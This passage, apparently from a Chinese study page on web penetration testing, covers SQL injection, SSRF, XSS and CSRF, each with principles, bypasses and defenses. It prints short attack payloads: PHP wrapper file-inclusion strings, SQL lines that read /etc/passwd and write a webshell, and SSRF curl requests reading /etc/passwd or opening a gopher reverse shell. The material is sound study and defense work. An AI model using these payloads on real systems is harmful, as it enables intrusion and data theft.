SYSTEM &amp;quot;http://www.w3school.com.cn/dtd/entities.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY copyright SYSTEM &amp;quot;http://www.w3school.com.cn/dtd/entities.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;author&amp;gt;&amp;amp;writer;&amp;amp;copyright;&amp;lt;/author&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;19&#34;&gt;
&lt;li&gt;
&lt;p&gt;常见端口与对应服务&lt;br /&gt;
 21:ftp  22:ssh  53:DNS  80:http  135/445:samba 服务  443:https  1433:sqlserver  1521:oracle 3306:mysql  3389:rdp 远程  8080:tomcat  8888: 宝塔  6378:redis  50050:cs&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件类型 MIME&lt;br /&gt;
MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。&lt;br /&gt;
MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。&lt;br /&gt;
浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理 URL, 因此 Web 服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。&lt;br /&gt;
MIME 通用结构为：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type/subtype&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;NTFS 数据流&lt;br /&gt;
 NTFS 数据流文件，也叫 Alternate data streams，简称 ADS，是 NTFS 文件系统的一个特性之一，允许单独的数据流文件存在，同时也允许一个文件附着多个数据流，即除了主文件流之外还允许许多非主文件流寄生在主文件流之中，它使用资源派生的方式来维持与文件相关信息，并且这些寄生的数据流文件我们使用资源管理器是看不到的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;tomcat ajp 协议&lt;br /&gt;
 Apache Tomcat 支持 AJP 协议，用来通过反向代理到 Tomcat 的请求和相关的数据，AJP 协议的作用是，当一个请求包含请求主体时，一个未经允许的、包含请求主体首部分（或可能所有的）的 AJP 消息被发送到 Tomcat。在某些情况下，Tomcat 会把这个消息当作一个新的请求来处理，而不会当作请求主体。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IIS&lt;br /&gt;
IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组件，专业的说，IIS 可以赋予一部主机电脑一组以上的 IP 地址，而且还可以有一个以上的域名作为 Web 网站。简单来说：Internet Information Service（IIS）是 windows 开设 web 网页服务的组件，用来搭载网站运行程序的平台的。还能提供 FTP，SMTP 等服务。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PHP 伪协议&lt;br /&gt;
 PHP 伪协议指的是 PHP 所支持的协议与封装协议，在 web 渗透漏洞利用中常用于配合文件包含进行 web 攻击，从而获取网站权限。&lt;br /&gt;
常用伪协议与方法如下所示：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file://     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=off&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=file://C:phpinfo.txt  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用于访问本地文件系统 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php://filter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=off&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=php://filter/read=convert.base64-encode/resource=./index.php  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用于读取 php 文件源码内容 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php://input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=php://input, post 数据：&amp;lt;?php phpinfo ();?&amp;gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip://&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=off/on     allow_url_include=off/on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=zip://file.zip%23phpinfo.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 访问压缩文件中的子文件，子文件可修改为任意后缀依然会被当作 php 执行 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data://&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen=on     allow_url_include=on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=data:test/plain;&amp;lt;?php phpinfo ();?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?file=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 传递相应格式的数据来执行 php 代码 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sqlmap 扫 https 时，如果未经处理则会报错，因为 sqlmap 不能自动伪造证书。通常有两种办法处理：添加 --force-ssl 参数； 走本地代理端口访问。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;指纹是组件上能标识对象类型的一段特征信息，用来在渗透测试信息收集环节中快速识别目标服务。对于你所渗透目标的操作系统、数据库、服务、开发语言、框架、中间件、CMS 等都包含了一些特征信息来标识它。通过发现这些特征信息并对它进行识别可以帮助我们快速地制定渗透策略，是渗透环节中关键的一步。常见的识别方式：源码特征信息提取；响应包 header 或者 body 特征信息提取；静态文件内容特征提取；静态文件 MD5 值匹配；根据请求协议识别；基于 URL 关键字识别。常用工具：whatweb (kali)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;常见漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见漏洞&#34;&gt;#&lt;/a&gt; 常见漏洞&lt;/h1&gt;
&lt;h2 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h2&gt;
&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;由于程序没有细致的过滤用户输入的数据，造成 SQL 字符串拼接，进而恶意的 SQL 语句被执行，造成数据库信息泄露，网页篡改，数据库被恶意操作等。&lt;/p&gt;
&lt;h3 id=&#34;挖掘&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;p&gt;SQL 注入漏洞的位置有很多，但是最常见的是在 Web 应用程序中的输入字段，例如登录表单、搜索表单、注册表单等。攻击者可以通过在这些输入字段中注入恶意代码来执行 SQL 命令，从而获取敏感数据或控制数据库。此外，SQL 注入漏洞还可能存在于 Web 应用程序中的其他位置，例如 URL 参数、HTTP 标头、Cookie 等。&lt;/p&gt;
&lt;h3 id=&#34;方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;p&gt;联合注入、报错注入、延时注入、布尔注入、DNS 注入、宽字节注入、堆叠注入，二次注入。&lt;/p&gt;
&lt;h3 id=&#34;函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#函数&#34;&gt;#&lt;/a&gt; 函数&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 文件读写 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show varibles like &amp;quot;% secure_file_priv&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select 1,2,3,load_file (&amp;#x27;/etc/passwd&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select 1,2,3,4 into outfile &amp;#x27;/var/www/html/shell.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 报错注入 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;updatexml ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;extractvalue ()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;输入验证：对用户输入进行验证，只允许输入预期的数据类型和长度。（正则过滤）&lt;/li&gt;
&lt;li&gt;参数化查询：使用参数化查询可以防止 SQL 注入攻击。参数化查询是指将 SQL 语句和参数分开处理，参数不会被解释为 SQL 语句的一部分。（php 转义、预编译）&lt;/li&gt;
&lt;li&gt;最小权限原则：数据库用户应该只被授予最小权限，以限制攻击者能够访问的数据。&lt;/li&gt;
&lt;li&gt;防火墙：使用防火墙可以限制对数据库的访问，只允许来自特定 IP 地址或端口的请求。&lt;/li&gt;
&lt;li&gt;waf 设备&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;h4 id=&#34;关键字过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字过滤&#34;&gt;#&lt;/a&gt; 关键字过滤&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;大小写转换&lt;/li&gt;
&lt;li&gt;注释符绕过：--， /**/，#(%23)&lt;/li&gt;
&lt;li&gt;内联注释绕过：/&lt;em&gt;!select&lt;/em&gt;/（注释中的语句为 MYSQL 特有的语句，这些语句在其它数据库中不会运行，但会在 MYSQL 中运行）&lt;/li&gt;
&lt;li&gt;双关键字绕过&lt;/li&gt;
&lt;li&gt;编码绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;空格过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格过滤&#34;&gt;#&lt;/a&gt; 空格过滤&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;使用注释符&lt;/li&gt;
&lt;li&gt;两个空格&lt;/li&gt;
&lt;li&gt;使用 ()&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;判断数据库类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断数据库类型&#34;&gt;#&lt;/a&gt; 判断数据库类型&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;页面报错信息&lt;/li&gt;
&lt;li&gt;查询数据库独有的数据表&lt;/li&gt;
&lt;li&gt;测试各数据库独有的连接符&lt;/li&gt;
&lt;li&gt;查询数据库版本&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mysql-数据库站点无法连接的常见原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-数据库站点无法连接的常见原因&#34;&gt;#&lt;/a&gt; MySQL 数据库站点无法连接的常见原因&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;数据库只允许本地连接&lt;/li&gt;
&lt;li&gt;站库分离&lt;/li&gt;
&lt;li&gt;数据库服务器端口被占用或更改了端口&lt;/li&gt;
&lt;li&gt;访问权限不正确&lt;/li&gt;
&lt;li&gt;数据库未启动&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mysql-写-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-写-shell&#34;&gt;#&lt;/a&gt; MySQL 写 shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;通过 outfile 写入 shell&lt;/li&gt;
&lt;li&gt;将一句话木马作为数据插入表中并查询导出&lt;/li&gt;
&lt;li&gt;开启全局日志写入 shell&lt;/li&gt;
&lt;li&gt;慢查询日志写入 shell（仅有在查询时间超过系统设定时间时才会写入 shell）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mysql-无法写-shell-的原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-无法写-shell-的原因&#34;&gt;#&lt;/a&gt; MySQL 无法写 shell 的原因&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;My.ini 配置 secure-file-priv 为空或 / 则可以导出导入无限制&lt;/li&gt;
&lt;li&gt;绝对路径不正确&lt;/li&gt;
&lt;li&gt;没有读写权限&lt;/li&gt;
&lt;li&gt;没有开启全局日志或慢查询日志&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;h3 id=&#34;原理-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-2&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;服务器请求伪造，服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，服务器就以服务器自己的身份去访问其他服务器的资源。&lt;/p&gt;
&lt;h3 id=&#34;挖掘-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-2&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;分享：通过 URL 地址分享网页内容&lt;/li&gt;
&lt;li&gt;转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览&lt;/li&gt;
&lt;li&gt;在线翻译：通过 URL 地址翻译对应文本内容&lt;/li&gt;
&lt;li&gt;图片加载与下载：通过 URL 地址加载或下载图片&lt;/li&gt;
&lt;li&gt;图片、文章收藏功能&lt;/li&gt;
&lt;li&gt;未公开的 api 实现以及其他调用 URL 的功能&lt;/li&gt;
&lt;li&gt;从 URL 关键字中寻找，Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-2&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;dict 协议，泄露安装软件版本信息，查看端口，操作内网 redis 服务等：dict://serverip:port / 命令：参数&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&amp;#x27; // 利用 dict 探测端口 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;file 协议，在有回显的情况下，利用 file 协议可以读取任意内容&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=file:///etc/passwd&amp;#x27; // 利用 file 协议查看文件 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gopher 协议，gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&amp;#x27; // 利用 gopher 反弹 shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;http/s 协议，探测内网主机存活&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-2&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;采用短网址绕过&lt;/li&gt;
&lt;li&gt;对 ip 地址进行进制转换&lt;/li&gt;
&lt;li&gt;利用特殊域名，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuaW8=&#34;&gt;example.io&lt;/span&gt; 可以指向任意域名，则 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS5leGFtcGxlLmlv&#34;&gt;127.0.0.1.example.io&lt;/span&gt; 最终会被解析为 127.0.0.1&lt;/li&gt;
&lt;li&gt;利用 [::]，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMQ==&#34;&gt;http://127.0.0.1&lt;/span&gt; &amp;gt;&amp;gt; http://[::127.0.0.1]&lt;/li&gt;
&lt;li&gt;利用句号，比如 127.0.0.1  &amp;gt;&amp;gt; 127。0。0。1&lt;/li&gt;
&lt;li&gt;CRLF 编码绕过&lt;/li&gt;
&lt;li&gt;使用封闭的字母和数字&lt;/li&gt;
&lt;li&gt;当限制只能使用 http 协议时，可以采取 302 跳转或短地址&lt;/li&gt;
&lt;li&gt;限制为 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29t&#34;&gt;example.com&lt;/span&gt; 域名时，采用 http 基本身份认证的方式绕过，即 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54eHguY29tQHd3dy54eGMuY29t&#34;&gt;http://www.xxx.com@www.xxc.com&lt;/span&gt;，在对 @解析域名中，不同的处理函数存在处理差异&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;源码中的危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码中的危险函数&#34;&gt;#&lt;/a&gt; 源码中的危险函数&lt;/h3&gt;
&lt;p&gt;file_get_contents，fsockopen，curl_exec，fopen，readfile。&lt;/p&gt;
&lt;h2 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h2&gt;
&lt;h3 id=&#34;原理-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-3&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;web 页面插入恶意 Js 代码，浏览器解析执行获取用户 cookie。&lt;/p&gt;
&lt;h3 id=&#34;挖掘-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-3&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;重灾区：评论区、留言区、个人信息、订单信息等&lt;/li&gt;
&lt;li&gt;针对型：站内信、网页即时通讯、私信、意见反馈&lt;/li&gt;
&lt;li&gt;存在风险：搜索框、当前目录、图片属性等&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;方法-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-3&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;p&gt;存储型 XSS，反射型 XSS，DOM 型 XSS&lt;/p&gt;
&lt;h3 id=&#34;防御-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-2&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;正则过滤（标签 /js 代码 / 事件）&lt;/li&gt;
&lt;li&gt;用户的输入进行 html 编码输出（无法进行闭合）&lt;/li&gt;
&lt;li&gt;服务端设置会话 Cookie 的 HTTP Only 属性（不能获取 cookie）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;绕过-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-3&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;爆破寻找是否存在能够使用的标签和属性。&lt;/li&gt;
&lt;li&gt;利用一些框架或模板的特性，比如在 使用 JavaScript template literal 的页面中 ，如果 `` 之间包含 ${code}，就会执行 code。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;xss-的功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss-的功能&#34;&gt;#&lt;/a&gt; XSS 的功能&lt;/h3&gt;
&lt;p&gt;获取 cookie、获取管理员 ip、xss 蠕虫、钓鱼攻击、前端 JS 挖矿、键盘记录、屏幕截图。&lt;/p&gt;
&lt;h2 id=&#34;csrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h2&gt;
&lt;h3 id=&#34;原理-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-4&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;指利用受害者尚未失效的身份认证信息、（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害人的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（转账，改密码等）。&lt;/p&gt;
&lt;h3 id=&#34;方法-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-4&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;GET 型：直接改 URL 就好&lt;/li&gt;
&lt;li&gt;POST 型：想办法利用用户数据提交表单&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;防御-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-3&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;校验 token：让请求带上一个额外的 csrf_token，来确保请求是通过网站的前端页面发送的。这个 csrf_token 由服务器颁发，不要放到 cookie 里，要通过其他方式提供给网站的前端页面，一种方式是放到 DOM 上。前端请求时就会从 DOM 找出这个 csrf_token，作为一个参数带上，让服务端校验。&lt;/li&gt;
&lt;li&gt;使用严格的 SameSite：Cookie 有一个 SameSite 属性，设置为严格模式（非 none 值），可以让其他网站的中跨域请求不带上 Cookie。&lt;/li&gt;
